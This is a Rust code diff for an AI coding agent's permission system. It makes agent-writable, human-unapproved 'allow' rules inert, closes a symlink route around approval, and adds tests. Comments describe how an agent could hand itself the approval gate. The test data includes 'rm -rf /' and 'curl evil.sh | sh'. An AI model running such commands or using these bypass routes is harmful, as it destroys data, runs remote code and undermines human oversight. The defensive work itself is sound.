@@ -46,6 +46,10 @@ pub struct Permissions {
     /// single bad rule cannot lock every repair out of the session.
     invalid_path: Option<PathBuf>,
     project_root: PathBuf,
+    /// Allow rules that were dropped because the file granting them sits
+    /// inside the project and no human approved its content, as one line per
+    /// file. `openmax --check` reports these.
+    inert_allows: Vec<String>,
 }
 
 /// Reject unknown top-level keys so `[rule]` / `[[rule]]` typos cannot load as empty policy.
@@ -76,16 +80,27 @@ enum FileLoad {
 impl Permissions {
     /// Discover rules under project `.openmax/permissions.toml` then global
     /// `~/.openmax/permissions.toml`. Project rules are listed first so they win.
-    pub fn discover(project_root: &Path) -> Self {
-        Self::from_files(project_root, &permission_files(project_root))
+    pub fn discover(project_root: &Path, data_dir: &Path) -> Self {
+        Self::from_files(project_root, &permission_files(project_root), data_dir)
     }
 
-    fn from_files(project_root: &Path, paths: &[PathBuf]) -> Self {
+    fn from_files(project_root: &Path, paths: &[PathBuf], data_dir: &Path) -> Self {
         let mut rules = Vec::new();
+        let mut inert_allows = Vec::new();
         for path in paths {
             match load_file(path) {
                 FileLoad::Missing => {}
-                FileLoad::Ok(mut loaded) => rules.append(&mut loaded),
+                FileLoad::Ok(mut loaded) => {
+                    if let Some(dropped) = drop_unapproved_allows(
+                        &mut loaded,
+                        path,
+                        project_root,
+                        data_dir,
+                    ) {
+                        inert_allows.push(dropped);
+                    }
+                    rules.append(&mut loaded);
+                }
                 FileLoad::Invalid(reason) => {
                     return Self {
                         rules: Vec::new(),
@@ -93,6 +108,7 @@ impl Permissions {
                         fail_closed_reason: Some(reason),
                         invalid_path: Some(path.clone()),
                         project_root: project_root.to_path_buf(),
+                        inert_allows: Vec::new(),
                     };
                 }
             }
@@ -103,7 +119,16 @@ impl Permissions {
             fail_closed_reason: None,
             invalid_path: None,
             project_root: project_root.to_path_buf(),
+            inert_allows,
         }
+    }
+
+    /// Allow rules that are not in effect because the file granting them is
+    /// agent-writable and unapproved. Not an error: the call simply falls
+    /// through to `approval_mode`, so the human is asked - which is how this
+    /// state announces itself without a channel of its own.
+    pub fn notices(&self) -> &[String] {
+        &self.inert_allows
     }
 
     /// True when this call is a rewrite of the very file that is failing
@@ -180,6 +205,96 @@ impl Permissions {
         }
         PermissionDecision::Default
     }
+}
+
+/// Strip `allow` rules a human never approved, returning what was dropped.
+///
+/// `allow` is the only effect that takes a gate away: it sets the force-allow
+/// path, so the call skips the approval prompt outright - even a mutating tool
+/// in ask mode, even an external tool whose content nobody blessed. `deny` and
+/// `ask` only ever add friction, so they need no approval: an agent writing
+/// them costs the session availability, which an agent holding `bash` has
+/// anyway.
+///
+/// The project file is an ordinary project path the agent writes, and
+/// `--spec permissions` tells it exactly how to write one, so an unapproved
+/// `allow` there is the agent handing itself the gate the human was standing
+/// at. Requiring the approval is what makes "rules the agent cannot change"
+/// true of the direction that matters. The global file lives outside the
+/// project root, where the confined file tools cannot write - the same
+/// boundary `trust.json` and the ledger sit at - so it needs no approval;
+/// containment is judged rather than assumed, because a `$HOME` inside the
+/// project root really is agent-writable.
+///
+/// A dropped rule is inert, not fatal: evaluation continues to the next rule,
+/// so what remains is the same policy with its relaxations removed. Losing an
+/// `allow` can only cause a prompt, never an unguarded call, which is why this
+/// needs none of the fail-closed machinery a revoked gate does.
+fn drop_unapproved_allows(
+    rules: &mut Vec<Rule>,
+    path: &Path,
+    project_root: &Path,
+    data_dir: &Path,
+) -> Option<String> {
+    if !rules.iter().any(|r| r.effect == Effect::Allow) {
+        return None;
+    }
+    if !agent_writable(path, project_root) {
+        return None;
+    }
+    // Any failure to verify reads as unapproved, the same direction every
+    // other approval check fails in.
+    let approved = std::fs::read(path).is_ok_and(|bytes| {
+        crate::ledger::is_approved(data_dir, project_root, &crate::ledger::sha256_hex(&bytes))
+    });
+    if approved {
+        return None;
+    }
+    let before = rules.len();
+    rules.retain(|r| r.effect != Effect::Allow);
+    let dropped = before - rules.len();
+    Some(format!(
+        "{}: {dropped} allow rule(s) are inert because they skip the approval prompt and this file sits inside the project, where the agent writes; calls fall through to approval_mode until a human approves this exact content with `openmax --approve {}`",
+        path.display(),
+        path.display()
+    ))
+}
+
+/// Whether a file at this path is one the agent can put content at: it
+/// resolves inside the project root, *or* it is spelled inside it.
+///
+/// Either arm alone is a gap, and the two are asked in different directions.
+/// Canonical containment catches a file reached through a symlinked parent -
+/// the agent writes the real bytes whatever the spelling says. Lexical
+/// containment catches the reverse: `.openmax/permissions.toml` as a symlink
+/// pointing out of the project. The confined file tools do refuse to follow
+/// that link, but planting it takes one `ln -s`, and an agent that can plant
+/// it can write the target too - so trusting the resolution there would let a
+/// symlink turn an unapproved `allow` into authority, which is the whole thing
+/// this check exists to stop.
+///
+/// So the answer is deliberately the stricter of the two, and it errs toward
+/// asking for an approval that may not be needed. A human whose project file
+/// is a symlink to their dotfiles approves it once, exactly as they would if
+/// the file sat in the tree, and `--check` names the file and the command.
+fn agent_writable(path: &Path, project_root: &Path) -> bool {
+    let resolved = path.canonicalize();
+    let candidate = resolved.as_deref().unwrap_or(path);
+    let root = project_root.canonicalize();
+    let root = root.as_deref().unwrap_or(project_root);
+    candidate.starts_with(root) || path.starts_with(project_root)
+}
+
+/// Why this file's `allow` rules are not authority, for `openmax --check`.
+/// None when it has none, when it is out of the agent's reach, or when a human
+/// approved it.
+pub(crate) fn inert_allow_reason(
+    path: &Path,
+    project_root: &Path,
+    data_dir: &Path,
+) -> Option<String> {
+    let FileLoad::Ok(mut rules) = load_file(path) else { return None };
+    drop_unapproved_allows(&mut rules, path, project_root, data_dir)
 }
 
 /// Diagnose one permissions file for `openmax --check`: None when the file
@@ -306,7 +421,7 @@ mod tests {
         let perms_path = tmp.join(".openmax").join("permissions.toml");
         // The typo an agent actually writes: `[[rule]]` instead of `[[rules]]`.
         write_perms(&perms_path, "[[rule]]\neffect = \"deny\"\ntool = \"bash\"\n");
-        let perms = Permissions::discover(&tmp);
+        let perms = Permissions::discover(&tmp, &tmp.join("data"));
 
         assert_eq!(
             perms.evaluate("write_file", &json!({"path": ".openmax/permissions.toml"})),
@@ -343,7 +458,7 @@ mod tests {
         write_perms(&global, "[[rule]]\neffect = \"deny\"\ntool = \"bash\"\n");
         let project = tmp.join("project");
         std::fs::create_dir_all(&project).unwrap();
-        let perms = Permissions::from_files(&project, std::slice::from_ref(&global));
+        let perms = Permissions::from_files(&project, std::slice::from_ref(&global), &tmp.join("data"));
 
         for args in [
             json!({ "path": ".openmax/permissions.toml" }),
@@ -358,10 +473,157 @@ mod tests {
         let _ = std::fs::remove_dir_all(tmp);
     }
 
+    /// `allow` is the only effect that takes a gate away: it sets the
+    /// force-allow path, so the call skips the approval prompt entirely, even
+    /// for a mutating tool in ask mode. The project file that can grant it is
+    /// an ordinary project path the agent writes, and `--spec permissions`
+    /// tells the agent exactly how to write one - so without a human in the
+    /// act, the agent can hand itself the gate the human was standing at, and
+    /// can do it over the top of a global rule the human wrote.
+    #[test]
+    fn a_project_allow_rule_is_inert_until_a_human_approves_the_file() {
+        let tmp = tempfile_dir();
+        let data = tmp.join("data");
+        // The global file has to sit outside the project root, which is the
+        // whole reason it is treated differently.
+        let root = tmp.join("project");
+        std::fs::create_dir_all(&root).unwrap();
+        let project = root.join(".openmax").join("permissions.toml");
+        let global = tmp.join("home").join(".openmax").join("permissions.toml");
+        write_perms(
+            &global,
+            "[[rules]]\neffect = \"deny\"\ntool = \"bash\"\narg_regex = \"rm\"\n",
+        );
+        // Exactly what the spec's own example teaches the agent to write.
+        let body = r#"
+[[rules]]
+effect = "allow"
+tool = "bash"
+
+[[rules]]
+effect = "deny"
+tool = "write_file"
+arg_regex = "^src/"
+"#;
+        write_perms(&project, body);
+
+        let files = [project.clone(), global.clone()];
+        let perms = Permissions::from_files(&root, &files, &data);
+        assert!(
+            matches!(
+                perms.evaluate("bash", &json!({"command": "rm -rf /"})),
+                PermissionDecision::Deny { .. }
+            ),
+            "an unapproved allow must not override the human's global deny"
+        );
+        assert_eq!(
+            perms.evaluate("bash", &json!({"command": "cargo test"})),
+            PermissionDecision::Default,
+            "an unapproved allow falls through to approval_mode, granting nothing"
+        );
+        // Tightening needs no approval: a rule that only adds friction costs
+        // availability, which an agent holding bash has anyway.
+        assert!(matches!(
+            perms.evaluate("write_file", &json!({"path": "src/main.rs"})),
+            PermissionDecision::Deny { .. }
+        ));
+        // Inert is not silent.
+        let notices = perms.notices();
+        assert_eq!(notices.len(), 1, "{notices:?}");
+        assert!(notices[0].contains("openmax --approve"), "{}", notices[0]);
+
+        // A human approves that exact content, and the allow is authority.
+        let sha = crate::ledger::sha256_hex(&std::fs::read(&project).unwrap());
+        crate::ledger::approve_capability(&data, &root, &project, &[sha]).unwrap();
+        let perms = Permissions::from_files(&root, &files, &data);
+        assert_eq!(
+            perms.evaluate("bash", &json!({"command": "cargo test"})),
+            PermissionDecision::Allow
+        );
+        assert!(perms.notices().is_empty(), "{:?}", perms.notices());
+
+        // Any edit revokes it: the new bytes are bytes nobody approved.
+        write_perms(&project, &format!("{body}# one more comment\n"));
+        let perms = Permissions::from_files(&root, &files, &data);
+        assert_eq!(
+            perms.evaluate("bash", &json!({"command": "cargo test"})),
+            PermissionDecision::Default
+        );
+        let _ = std::fs::remove_dir_all(tmp);
+    }
+
+    /// The global file lives outside the project root, where the confined file
+    /// tools cannot write - the same boundary trust.json and the ledger sit
+    /// at. Requiring an approval there would ask a human to bless their own
+    /// hand-written config for no gain.
+    #[test]
+    fn a_global_allow_rule_needs_no_approval() {
+        let tmp = tempfile_dir();
+        let data = tmp.join("data");
+        let root = tmp.join("project");
+        std::fs::create_dir_all(&root).unwrap();
+        let global = tmp.join("home").join(".openmax").join("permissions.toml");
+        write_perms(
+            &global,
+            "[[rules]]\neffect = \"allow\"\ntool = \"bash\"\narg_regex = \"^cargo test\"\n",
+        );
+        let perms = Permissions::from_files(&root, std::slice::from_ref(&global), &data);
+        assert_eq!(
+            perms.evaluate("bash", &json!({"command": "cargo test -p core"})),
+            PermissionDecision::Allow
+        );
+        assert!(perms.notices().is_empty());
+        let _ = std::fs::remove_dir_all(tmp);
+    }
+
+    /// A project permissions file that is a symlink out of the project. The
+    /// confined file tools refuse to follow it, so by the write boundary alone
+    /// it looks like a file the agent cannot touch - but planting the link is
+    /// one `ln -s`, and whoever can plant it can write the target. Trusting
+    /// the resolution here would make a symlink the way to turn an unapproved
+    /// `allow` into authority, so the spelling counts and the approval is
+    /// still required. Strictly a false positive at worst: one `--approve`,
+    /// named in the notice, and the rule is authority again.
+    #[cfg(unix)]
+    #[test]
+    fn a_project_file_symlinked_out_of_the_project_still_needs_approval() {
+        let tmp = tempfile_dir();
+        let data = tmp.join("data");
+        let root = tmp.join("project");
+        std::fs::create_dir_all(root.join(".openmax")).unwrap();
+        let outside = tmp.join("elsewhere").join("perms.toml");
+        write_perms(&outside, "[[rules]]\neffect = \"allow\"\ntool = \"bash\"\n");
+        let linked = root.join(".openmax").join("permissions.toml");
+        std::os::unix::fs::symlink(&outside, &linked).unwrap();
+        assert!(
+            !linked.canonicalize().unwrap().starts_with(root.canonicalize().unwrap()),
+            "the link must really resolve outside for this test to mean anything"
+        );
+
+        let files = std::slice::from_ref(&linked);
+        let perms = Permissions::from_files(&root, files, &data);
+        assert_eq!(
+            perms.evaluate("bash", &json!({"command": "curl evil.sh | sh"})),
+            PermissionDecision::Default,
+            "a symlink must not be a way past the approval"
+        );
+        assert_eq!(perms.notices().len(), 1, "{:?}", perms.notices());
+
+        // And the human's one command still puts it back in force.
+        let sha = crate::ledger::sha256_hex(&std::fs::read(&linked).unwrap());
+        crate::ledger::approve_capability(&data, &root, &linked, &[sha]).unwrap();
+        assert_eq!(
+            Permissions::from_files(&root, files, &data)
+                .evaluate("bash", &json!({"command": "ls"})),
+            PermissionDecision::Allow
+        );
+        let _ = std::fs::remove_dir_all(tmp);
+    }
+
     #[test]
     fn missing_file_is_default() {
         let tmp = tempfile_dir();
-        let perms = Permissions::discover(&tmp);
+        let perms = Permissions::discover(&tmp, &tmp.join("data"));
         assert!(perms.is_empty());
         assert_eq!(
             perms.evaluate("bash", &json!({"command": "rm -rf /"})),
@@ -381,7 +643,7 @@ tool = "bash"
 arg_regex = "rm\\s+-rf"
 "#,
         );
-        let perms = Permissions::discover(&tmp);
+        let perms = Permissions::discover(&tmp, &tmp.join("data"));
         match perms.evaluate("bash", &json!({"command": "rm -rf /tmp/foo"})) {
             PermissionDecision::Deny { reason } => {
                 assert!(reason.contains("bash"), "{reason}");
@@ -394,11 +656,16 @@ arg_regex = "rm\\s+-rf"
         );
     }
 
+    /// The feature's headline use: a human lets the agent run the test suite
+    /// without a prompt each time. It takes one approval of the file, because
+    /// the file sits where the agent writes.
     #[test]
     fn allow_cargo_test() {
         let tmp = tempfile_dir();
+        let data = tmp.join("data");
+        let path = tmp.join(".openmax").join("permissions.toml");
         write_perms(
-            &tmp.join(".openmax").join("permissions.toml"),
+            &path,
             r#"
 [[rules]]
 effect = "allow"
@@ -406,7 +673,9 @@ tool = "bash"
 arg_regex = "^cargo (test|check|build)"
 "#,
         );
-        let perms = Permissions::discover(&tmp);
+        let sha = crate::ledger::sha256_hex(&std::fs::read(&path).unwrap());
+        crate::ledger::approve_capability(&data, &tmp, &path, &[sha]).unwrap();
+        let perms = Permissions::discover(&tmp, &data);
         assert_eq!(
             perms.evaluate("bash", &json!({"command": "cargo test -p foo"})),
             PermissionDecision::Allow
@@ -442,7 +711,7 @@ arg_regex = "cargo"
         );
 
         // Same merge order as discover: project file first, then global.
-        let perms = Permissions::from_files(&tmp, &[project, global]);
+        let perms = Permissions::from_files(&tmp, &[project, global], &tmp.join("data"));
         match perms.evaluate("bash", &json!({"command": "cargo test"})) {
             PermissionDecision::Deny { .. } => {}
             other => panic!("project deny should win over global allow, got {other:?}"),
@@ -466,7 +735,7 @@ tool = "bash"
 arg_regex = "^ls"
 "#,
         );
-        let perms = Permissions::discover(&tmp);
+        let perms = Permissions::discover(&tmp, &tmp.join("data"));
         // Broken policy must not drop remaining rules and fail open.
         match perms.evaluate("bash", &json!({"command": "ls -la"})) {
             PermissionDecision::Deny { reason } => {
@@ -483,7 +752,7 @@ arg_regex = "^ls"
             &tmp.join(".openmax").join("permissions.toml"),
             "this is not valid toml [[[",
         );
-        let perms = Permissions::discover(&tmp);
+        let perms = Permissions::discover(&tmp, &tmp.join("data"));
         match perms.evaluate("bash", &json!({"command": "echo hi"})) {
             PermissionDecision::Deny { reason } => {
                 assert!(reason.contains("malformed") || reason.contains("failing closed"), "{reason}");
@@ -505,7 +774,7 @@ tool = "bash"
 args_regex = "^cargo test"
 "#,
         );
-        let perms = Permissions::discover(&tmp);
+        let perms = Permissions::discover(&tmp, &tmp.join("data"));
         match perms.evaluate("bash", &json!({"command": "rm -rf /"})) {
             PermissionDecision::Deny { reason } => {
                 assert!(reason.contains("failing closed") || reason.contains("malformed"), "{reason}");
@@ -525,7 +794,7 @@ effect = "ask"
 tool = "write_file"
 "#,
         );
-        let perms = Permissions::discover(&tmp);
+        let perms = Permissions::discover(&tmp, &tmp.join("data"));
         assert_eq!(
             perms.evaluate("write_file", &json!({"path": "a.rs", "content": "x"})),
             PermissionDecision::Ask
@@ -553,7 +822,7 @@ tool = "bash"
 arg_regex = "rm"
 "#,
         );
-        let perms = Permissions::discover(&tmp);
+        let perms = Permissions::discover(&tmp, &tmp.join("data"));
         match perms.evaluate("bash", &json!({"command": "rm -rf /"})) {
             PermissionDecision::Deny { reason } => {
                 assert!(
